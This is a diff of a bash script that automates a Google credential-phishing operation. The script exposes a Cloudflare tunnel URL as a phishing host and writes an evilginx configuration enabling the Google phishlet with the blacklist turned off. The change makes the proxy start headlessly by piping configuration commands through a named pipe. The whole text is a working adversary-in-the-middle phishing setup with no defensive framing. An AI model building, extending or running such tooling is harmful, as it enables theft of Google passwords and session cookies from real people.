@@ -18,12 +18,15 @@ for i in $(seq 1 60); do
 done
 [ -n "$URL" ] && echo "PHISH_URL=$URL" || { echo "NO_TUNNEL_URL_FOUND"; tail -n 30 cloudflared.log; }
 
-echo "--- writing evilginx config (enable google phishlet) ---"
+echo "--- writing evilginx config (enable google) ---"
 $SUDO mkdir -p /root/.evilginx
 echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$URL\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
 
-echo "--- starting evilginx ---"
-"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer 2>&1 | tee evilginx.log &
+echo "--- starting evilginx (headless via fifo) ---"
+HOST="${URL#https://}"
+rm -f /tmp/eg_in; mkfifo /tmp/eg_in
+( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
+"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &
 
 echo "--- waiting for :443 (up to 60s) ---"
 BOUND=0
